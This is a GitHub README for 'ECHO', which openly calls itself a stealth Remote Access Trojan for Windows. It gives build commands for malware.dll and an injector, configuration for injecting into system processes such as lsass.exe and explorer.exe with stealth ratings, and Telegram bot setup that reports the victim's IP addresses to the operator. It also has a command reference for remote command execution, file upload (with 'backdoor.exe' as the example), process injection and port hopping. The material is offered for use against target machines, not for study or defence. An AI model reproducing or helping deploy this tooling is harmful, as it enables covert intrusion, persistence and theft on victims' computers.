## 🚀 ECHO - Encrypted ChaCha20 Hopping Operator

[![Windows](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
[![C++](https://img.shields.io/badge/Language-C++11-00599C?style=flat-square&logo=c%2B%2B)](https://isocpp.org/)

![ECHO](https://github.com/user-attachments/assets/ad86665b-8c2f-4892-ab84-b78fdd226439)

> **A sophisticated, stealth-oriented Remote Access Trojan featuring encrypted communication, process injection, dynamic port hopping, and optional Telegram bot integration.**

## Video Test

<video src="https://github.com/user-attachments/assets/8838b613-0b1f-4e58-8d5a-c1500cd4b07c" width="800" controls></video>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Project Structure](#-project-structure)
- [Dependencies](#-Dependencies)
- [Quick Start](#-quick-start)
- [Configuration Guide](#-configuration-guide)
- [Telegram Integration](#-telegram-integration)
- [Process Injection Targets](#-process-injection-targets)
- [Commands Reference](#-commands-reference)
- [Building from Source](#-building-from-source)

---

## 🎯 Overview

This is a professional-grade Remote Access Trojan written in **C++11** for Windows environments. The tool provides secure, encrypted remote access with advanced capabilities including process migration, dynamic port hopping, file transfer, and optional Telegram notifications.

**Key Architecture:**
- **Server (DLL)** - Injected into target processes, listens for commands
- **Client (EXE)** - Connects to server, sends encrypted commands
- **Crypto Layer** - XOR-based encryption for all communications
- **Telegram Module** - Optional startup notifications

---

## ✨ Features

| Category | Capabilities |
|----------|--------------|
| 🔐 **Encryption** | XOR-based crypto, session key management, anti-packet inspection |
| 💉 **Injection** | Remote thread injection, 12+ target processes, automatic migration |
| 🔄 **Port Hopping** | On-the-fly port changes, random port generation (4000-60000) |
| 🤖 **Telegram** | Instant startup notifications, real-time alerts |
| 📁 **File Transfer** | Upload/download files, chunked transfer support |
| 💻 **Command Execution** | Remote cmd execution, directory navigation |
| 📊 **Process Management** | List processes, get process info, injection targets |
| 🛡️ **Stealth** | No console windows, minimal footprint, legit process masking |

---

## 📁 Project Structure

```text
Project Root/
│
├── 📄 client.cpp          # Client loader - connects and sends commands
├── 📄 loader.cpp          # DLL injector - loads server into target process
├── 📄 server.cpp          # Main server DLL - handles remote commands
├── 📄 pack.py             # Python packer utility
├── 📄 packed.h            # Packed payload header
├── 📄 run.bat             # Quick launch script
│
└── 📁 lib/
    ├── 🔒 crypto.h        # XOR encryption module
    └── 📡 telegram.h      # Telegram bot integration module
```

---

## 📦 Dependencies

### Windows Requirements

| Component | Version | Purpose |
|-----------|---------|---------|
| Windows OS | XP / 7 / 8 / 10 / 11 | Target platform |
| Internet (optional) | Any | Telegram notifications & public IP detection |

### Development Tools

| Tool | Version | Purpose |
|------|---------|---------|
| TDM-GCC | 9.2.0+ | Compiler for building DLL/EXE |
| MinGW-w64 | 8.1.0+ | Alternative compiler |
| Python | 3.x | Running pack.py utility |
| Make (optional) | Any | Automation |

### Libraries (Built-in / No Installation)

| Library | Header | Purpose |
|---------|--------|---------|
| Winsock2 | `<winsock2.h>` | Network communication |
| Windows API | `<windows.h>` | System calls, threading |
| Thread | `<thread>` | Multi-threading support |
| FileSystem | `<fstream>` | File operations |
| Random | `<random>` | Random port generation |
| TLHelp32 | `<tlhelp32.h>` | Process listing & injection |
| Shell32 | `<shlobj.h>` | Shell operations |

---

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/batmanpriv/ECHO
cd ECHO
```

### 2. Configure Settings

#### Edit server.cpp to set your preferences:

```cpp
int DEFAULT_PORT = 4545;              // Change default port
// #define TELEGRAM                    // Uncomment to enable Telegram
```

### 3. Build 

```bash
run.bat
```

### 5. Deploy & Connect

```bash
# On target machine - inject DLL
injector.exe

# On attacker machine - connect
client.exe
```

## ⚙️ Configuration Guide

### Server Configuration (server.cpp)

```cpp
// Network Settings
#define BUFFER_SIZE 51192           // Network buffer size
#define FILE_BUFFER 8192            // File transfer chunk size
#define SOCKET_TIMEOUT_MS 120000    // Socket timeout (2 minutes)

// Port Configuration
int DEFAULT_PORT = 4545;            // Default listening port
                                    // ⚠️ Ignored when Telegram is enabled

// Feature Toggles
// #define TELEGRAM                  // Enable Telegram support
                                    // When enabled: random port + notifications
                                    // When disabled: uses DEFAULT_PORT

// Crypto Settings
const unsigned char SECRET_KEY[] = "YourSecureKeyHere2024!@#$%";
```

### Client Configuration (client.cpp)

```cpp
// Default connection settings (can be overridden via command line)
const char* DEFAULT_IP = "127.0.0.1";
int DEFAULT_PORT = 4545;
```

### Loader Configuration (loader.cpp)

```cpp
// Target processes for DLL injection
const wchar_t* TARGET_PROCESSES[] = {
    L"explorer.exe",    // Windows Explorer (highly recommended)
    L"svchost.exe",     // Service Host (multiple instances)
    L"notepad.exe",     // Notepad (userland, easy target)
    L"winlogon.exe",    // Windows Logon (system level)
    L"services.exe",    // Services Control Manager
    L"lsass.exe",       // Local Security Authority
    L"spoolsv.exe",     // Print Spooler
    L"taskhost.exe",    // Task Host
    L"dwm.exe",         // Desktop Window Manager
    L"csrss.exe",       // Client Server Runtime
    L"wininit.exe",     // Windows Initialization
    L"conhost.exe"      // Console Host
};
```

## 🤖 Telegram Integration

### How It Works

### When #define TELEGRAM is uncommented in server.cpp:

1. 🔄 Random port generation - Server picks a random port (4000-60000)

2. 📡 Automatic notification - Sends startup message to your Telegram bot

3. 🚫 No default port - Never uses DEFAULT_PORT when Telegram is active

4. 📍 IP reporting - Sends both public and local IP addresses

### Setup Instructions

#### Step 1: Create Telegram Bot

1. Message @BotFather on Telegram

2. Send /newbot and follow instructions

3. Save your bot token (looks like 123456789:ABCdefGHIjklmNOPqrstUvWXyz)

#### Step 2: Get Your Chat ID

1. Message your bot once

2. Visit: https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates

3. Copy your chat ID from the response

#### Step 3: Configure (lib/telegram.h)

```cpp
#define TELEGRAM_BOT_TOKEN "123456789:ABCdefGHIjklmNOPqrstUvWXyz"
#define TELEGRAM_CHAT_ID "7295479621"
#define MIN_PORT 4000
#define MAX_PORT 60000
```

#### Step 4: Enable in Server

```cpp
// In server.cpp - remove the comment
#define TELEGRAM
```

### Sample Telegram Message

```text
🔔 *Server Started!* 🔔

🌐 *Public IP:* `203.45.67.89`
💻 *Local IP:* `192.168.1.100`
🔌 *Port:* `28461`
📡 *Status:* Listening for connections
```

## 💉 Process Injection Targets

The loader automatically attempts injection into these system processes:

| Process | Description | Stealth Level | Success Rate |
|---------|-------------|---------------|---------------|
| `explorer.exe` | Windows Shell | ⭐⭐⭐⭐⭐ | Very High |
| `svchost.exe` | Service Host | ⭐⭐⭐⭐⭐ | Very High |
| `notepad.exe` | Notepad | ⭐⭐⭐ | High |
| `winlogon.exe` | Windows Logon | ⭐⭐⭐⭐ | Medium |
| `services.exe` | Service Manager | ⭐⭐⭐⭐ | Medium |
| `lsass.exe` | LSA Service | ⭐⭐⭐⭐ | Medium |
| `spoolsv.exe` | Print Spooler | ⭐⭐⭐⭐ | High |
| `taskhost.exe` | Task Host | ⭐⭐⭐ | High |
| `dwm.exe` | Desktop Manager | ⭐⭐⭐⭐ | High |
| `csrss.exe` | Client Runtime | ⭐⭐⭐ | Low |
| `wininit.exe` | Windows Init | ⭐⭐⭐ | Low |
| `conhost.exe` | Console Host | ⭐⭐⭐⭐ | Very High |

> **⚠️ Note:** Some system processes (like `lsass.exe`, `csrss.exe`) may require elevated privileges.

---

## 📖 Commands Reference

### Basic Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show available commands | `help` |
| `exit` | Disconnect session | `exit` |
| `pwd` | Show current directory | `pwd` |
| `cd <path>` | Change directory | `cd C:\Windows` |
| `cls` | Clear screen | `cls` |

### System Commands

| Command | Description | Example |
|---------|-------------|---------|
| `<any cmd>` | Execute system command | `ipconfig` |
| `ps` | List running processes | `ps` |
| `tasklist` | List processes (Windows format) | `tasklist` |
| `me` | Get current process info | `me` |
| `whoami` | Get current user | `whoami` |

### Process Injection

| Command | Description | Example |
|---------|-------------|---------|
| `inject <PID>` | Inject into process by PID | `inject 1234` |
| `inject <name>` | Inject into process by name | `inject explorer.exe` |

### Port Hopping

| Command | Description | Example |
|---------|-------------|---------|
| `hop <port>` | Switch to new port (server side) | `hop 31337` |

### File Operations

| Command | Description | Example |
|---------|-------------|---------|
| `UPLOAD:<file>` | Upload file to server | `UPLOAD:backdoor.exe` |
| `DOWNLOAD:<file>` | Download file from server | `DOWNLOAD:config.ini` |

### Crypto Commands

| Command | Description | Example |
|---------|-------------|---------|
| `CRYPTO_SYNC` | Resynchronize encryption | `CRYPTO_SYNC` |

---

## 🔨 Building from Source

### Prerequisites

| Component | Requirement |
|-----------|-------------|
| OS | Windows XP or later |
| Compiler | TDM-GCC / MinGW-w64 |
| Libraries | Winsock2 (built-in) |
| Python (optional) | 3.x for pack.py |

### Build Commands

```bash
g++ -shared -o malware.dll server.cpp -lws2_32 -static-libgcc -static-libstdc++ -O2 -s
g++ -o client.exe client.cpp -lws2_32
python pack.py malware.dll packed.h
g++ -o injector.exe loader.cpp -lws2_32 -static-libgcc -static-libstdc++ -O2 -s -mwindows
```

